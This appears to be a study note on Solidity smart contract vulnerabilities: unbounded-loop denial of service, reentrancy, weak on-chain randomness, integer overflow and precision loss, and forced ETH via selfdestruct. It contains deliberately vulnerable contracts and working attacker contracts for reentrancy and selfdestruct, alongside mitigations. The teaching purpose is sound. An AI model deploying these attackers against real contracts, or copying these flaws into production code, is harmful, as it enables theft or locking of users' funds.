### Denial of Service: 
  It check for duplicates value but as the main array is long it will cost more gas.
  So assume in a lottery, the entrant fee depends on the number of people in the lottery.
  Now a hacker can call the function a million time using different accounts so no other player can join the lottery. 
  
```solidity
      // SPDX-License-Identifier: MIT
      pragma solidity 0.8.20;
      
      contract DoS {
          address[] entrants;
      
          function enter() public {
              // Check for duplicate entrants
              for (uint256 i; i < entrants.length; i++) {
                  if (entrants[i] == msg.sender) {
                      revert("You've already entered!");
                  }
              }
              entrants.push(msg.sender);
          }
      }
```

### Rentrancy Attack;

Here attacker will use `ReentrancyAttacker::receive()` to call the `ReentrancyVictim::withdrawBalance()` and in middle the `ReentrancyAttacker::receive()` will be called again. It will result in attacker gaining the eth from victim balance. It will keep going until the victim balance is 0.
It can be solved by simply moving the state change before the `ReentrancyVictim::withdrawBalance()` function. This is also known as CEI(check, effects, interaction). 

```solidity
      // SPDX-License-Identifier: MIT
      pragma solidity 0.8.20;
      contract ReentrancyVictim {
          mapping(address => uint256) public userBalance;
      
          function deposit() public payable {
              userBalance[msg.sender] += msg.value;
          }
      
          function withdrawBalance() public {
              uint256 balance = userBalance[msg.sender];
              // An external call and then a state change!
              // External call
              (bool success,) = msg.sender.call{value: balance}("");
              if (!success) {
                  revert();
              }
      
              // State change
              userBalance[msg.sender] = 0;
          }
      }
      
      contract ReentrancyAttacker {
          ReentrancyVictim victim;
      
          constructor(ReentrancyVictim _victim) {
              victim = _victim;
          }
      
          function attack() public payable {
              victim.deposit{value: 1 ether}();
              victim.withdrawBalance();
          }
      
          receive() external payable {
              if (address(victim).balance >= 1 ether) {
                  victim.withdrawBalance();
              }
          }
      }
```
### Weak Randomness Exploit

Here `WeakRandomness::msg.sender, block.prevrandao, block.timestamp` can be used to manipulate or guess the random number
 1. `block.timestamp`: miners can hold the transaction for a certain amount of sec to get the favourable timestamp.
 2. `block.prevrandao`: previously known as `block.difficulty` before the merge. It has biasability and predicatability issues.
 3. `msg.sender`: miner can mine the adress until they get the adress they want.

```solidity

      // SPDX-License-Identifier: MIT
      pragma solidity 0.8.20;
      
      // Inspired by https://github.com/crytic/slither/wiki/Detector-Documentation#weak-prng
      
      contract WeakRandomness {
          /*
           * @notice A fair random number generator
           */
          function getRandomNumber() external view returns (uint256) {
              uint256 randomNumber = uint256(keccak256(abi.encodePacked(msg.sender, block.prevrandao, block.timestamp)));
              return randomNumber;
          }
      }
      
      // prevrandao security considerations: https://eips.ethereum.org/EIPS/eip-4399

```
It can be mitigated using the Chainlink VRF and Commit reveal scheme

### Integer overflow:

```solidity

// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/*//////////////////////////////////////////////////////////////
                            OVERFLOW
//////////////////////////////////////////////////////////////*/

contract Overflow {
    uint8 public count;

    // uint8 has a max value of 255, so if we add 1 to 255, we get 0 if it's unchecked!
    // Versions prior to 0.8 of solidity also have this issue
    function increment(uint8 amount) public {
        unchecked {
            count = count + amount;
        }
    }
}

/*//////////////////////////////////////////////////////////////
                            UNDERFLOW
//////////////////////////////////////////////////////////////*/

contract Underflow {
    uint8 public count;

    // uint8 has a min value of 0, but if we subtract 1 from 0, we get 255 if it's unchecked!
    // Versions prior to 0.8 of solidity also have this issue
    function decrement() public {
        unchecked {
            count--;
        }
    }
}

/*//////////////////////////////////////////////////////////////
                            PRECISION LOSS
//////////////////////////////////////////////////////////////*/

contract PrecisionLoss {
    uint256 public moneyToSplitUp = 225;
    uint256 public users = 4;

    // This function will return 56, but we want it to return 56.25
    function shareMoney() public view returns (uint256) {
        return moneyToSplitUp / users;
    }
}

```
Overflow can be mitigated by using newer version of solidity and bigger uints

### Mishandling of ETH
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract SelfDestructMe {
    uint256 public totalDeposits;
    mapping(address => uint256) public deposits;

    function deposit() external payable {
        deposits[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }

    function withdraw() external {
        /*
            Apparently the only way to deposit ETH in the contract is via the `deposit` function.
            If that were the case, this strict equality would always hold.
            But anyone can deposit ETH via selfdestruct, or by setting this contract as the target
            of a beacon chain withdrawal.
            (see last paragraph of this section
            https://eth2book.info/capella/part2/deposits-withdrawals/withdrawal-processing/#performing-withdrawals),
            regardless of the contract not having a `receive` function.

            If anybody deposits ETH that way, then the equality breaks and the contract is DoS'd.
            To fix it, the code could be changed to >= instead of ==. Which means that the available
            ETH balance should be _at least_ `totalDeposits`, which makes more sense.
        */
        assert(address(this).balance == totalDeposits); // bad

        uint256 amount = deposits[msg.sender];
        totalDeposits -= amount;
        deposits[msg.sender] = 0;

        payable(msg.sender).transfer(amount);
    }
}

contract AttackSelfDestructMe {
    SelfDestructMe target;

    constructor(SelfDestructMe _target) payable {
        target = _target;
    }

    function attack() external payable {
        selfdestruct(payable(address(target)));
    }
}
```
